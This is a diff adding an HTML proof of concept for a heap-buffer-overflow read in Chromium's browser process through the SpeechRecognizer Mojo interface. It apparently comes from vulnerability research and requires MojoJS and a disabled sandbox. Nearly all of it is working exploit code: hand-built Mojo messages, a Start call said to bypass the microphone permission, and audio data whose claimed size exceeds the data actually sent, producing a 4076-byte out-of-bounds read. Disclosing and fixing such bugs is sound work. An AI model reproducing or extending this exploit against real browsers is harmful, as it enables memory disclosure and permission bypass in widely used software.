@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<!--
+  PoC: Browser-process heap-buffer-overflow via SpeechRecognizerImpl::AddAudioFromRenderer
+  Requires: --enable-blink-features=MojoJS,MojoJSTest --no-sandbox
+  Expected: ASan heap-buffer-overflow on Chrome_IOThread at speech_recognizer_impl.cc:341
+-->
+<html><head><title>PoC: Speech OOB Read</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+var L = document.getElementById('log');
+function log(m) { L.textContent += m + '\n'; }
+
+if (typeof Mojo === 'undefined') { log('FATAL: MojoJS not available'); throw 0; }
+
+// Minimal Mojo message builder
+function MB(n){this.b=new ArrayBuffer(n||4096);this.v=new DataView(this.b);this.o=0;this.h=[];}
+MB.prototype.u8=function(v){this.v.setUint8(this.o,v);this.o+=1;};
+MB.prototype.i16=function(v){this.v.setInt16(this.o,v,true);this.o+=2;};
+MB.prototype.u32=function(v){this.v.setUint32(this.o,v,true);this.o+=4;};
+MB.prototype.i32=function(v){this.v.setInt32(this.o,v,true);this.o+=4;};
+MB.prototype.u64=function(lo,hi){this.v.setUint32(this.o,lo,true);this.v.setUint32(this.o+4,hi||0,true);this.o+=8;};
+MB.prototype.al=function(a){var r=this.o%a;if(r)this.o+=(a-r);};
+MB.prototype.ah=function(h){var i=this.h.length;this.h.push(h);return i;};
+MB.prototype.get=function(){return{buffer:this.b.slice(0,this.o),handles:this.h};};
+
+// Build AddAudioFromRenderer(AudioDataS16) message
+// AudioDataS16 { int32 channel_count, int32 sample_rate, int32 frame_count, array<int16> data }
+function buildAudio(ch, sr, fr, data) {
+  var m = new MB(256 + data.length * 2);
+  // Message header (v0, ordinal=1 for AddAudioFromRenderer)
+  m.u32(24); m.u32(0); m.u32(0); m.u32(1); m.u32(0); m.u32(0);
+  // Params struct header + pointer to AudioDataS16
+  var p = m.o; m.u32(0); m.u32(0);
+  var bp = m.o; m.u64(0);
+  m.v.setUint32(p, m.o - p, true);
+  // AudioDataS16 struct
+  var ao = m.o; m.v.setUint32(bp, ao - bp, true);
+  var ah = m.o; m.u32(0); m.u32(0);
+  m.i32(ch); m.i32(sr); m.i32(fr); m.i32(0);
+  var dp = m.o; m.u64(0);
+  m.v.setUint32(ah, m.o - ah, true);
+  // Array<int16> body
+  var ar = m.o; m.v.setUint32(dp, ar - dp, true);
+  m.u32(8 + data.length * 2); m.u32(data.length);
+  for (var i = 0; i < data.length; i++) m.i16(data[i]);
+  m.al(8);
+  return m.get();
+}
+
+// Build SpeechRecognizer::Start message (ordinal=0)
+function buildStart(sr, cr, af, lang, ch, rate) {
+  var m = new MB(4096);
+  m.u32(24); m.u32(0); m.u32(0); m.u32(0); m.u32(0); m.u32(0);
+  var p = m.o; m.u32(0); m.u32(0);
+  var pp = m.o; m.u64(0);
+  m.v.setUint32(p, m.o - p, true);
+  var ro = m.o; m.v.setUint32(pp, ro - pp, true);
+  m.u32(0); m.u32(0);
+  m.u32(m.ah(sr)); m.u32(m.ah(cr)); m.u32(0); m.u32(5);
+  var lp = m.o; m.u64(0);
+  var gp = m.o; m.u64(0); m.u64(0);
+  m.u8(0x0B); m.u8(0); m.u8(0); m.u8(0);
+  m.u32(m.ah(af)); m.i32(ch); m.i32(rate); m.al(8);
+  m.v.setUint32(ro, m.o - ro, true);
+  var lo = m.o; m.v.setUint32(lp, lo - lp, true);
+  var lb = []; for (var i = 0; i < lang.length; i++) lb.push(lang.charCodeAt(i));
+  m.u32(8 + lb.length + 1); m.u32(lb.length);
+  for (var i = 0; i < lb.length; i++) m.u8(lb[i]); m.u8(0); m.al(8);
+  var go = m.o; m.v.setUint32(gp, go - gp, true);
+  m.u32(8); m.u32(0); m.al(8);
+  return m.get();
+}
+
+// --- PoC execution ---
+log('1. Binding media.mojom.SpeechRecognizer...');
+var rp = Mojo.createMessagePipe();
+var sp = Mojo.createMessagePipe();
+var cp = Mojo.createMessagePipe();
+var ap = Mojo.createMessagePipe();
+
+Mojo.bindInterface('media.mojom.SpeechRecognizer', rp.handle1, 'context');
+
+log('2. Sending Start with audio_forwarder (bypasses mic permission)...');
+var sm = buildStart(sp.handle1, cp.handle0, ap.handle1, 'en-US', 1, 16000);
+rp.handle0.writeMessage(new Uint8Array(sm.buffer), sm.handles);
+
+setTimeout(function() {
+  // OOB read parameters:
+  //   Claimed: 2 channels x 1024 frames = 2048 int16 values
+  //   Actual data: 10 int16 values (20 bytes)
+  //   OOB read: (2048 - 10) * 2 = 4076 bytes past allocation
+  var CHANNELS = 2, FRAMES = 1024, DATA_SIZE = 10;
+  var OOB = (CHANNELS * FRAMES - DATA_SIZE) * 2;
+  log('3. Sending malicious AudioDataS16:');
+  log('   claimed: ' + CHANNELS + ' ch x ' + FRAMES + ' fr = ' + (CHANNELS*FRAMES) + ' samples');
+  log('   actual:  ' + DATA_SIZE + ' samples (' + (DATA_SIZE*2) + ' bytes)');
+  log('   OOB read: ' + OOB + ' bytes');
+
+  var data = [];
+  for (var i = 0; i < DATA_SIZE; i++) data.push(0x4141);
+
+  var msg = buildAudio(CHANNELS, 16000, FRAMES, data);
+  var r = ap.handle0.writeMessage(new Uint8Array(msg.buffer), msg.handles);
+  log(r === Mojo.RESULT_OK ? '4. Sent. Check stderr for ASan report.' : '4. FAILED: ' + r);
+}, 2000);
+</script>
+</body>
+</html>
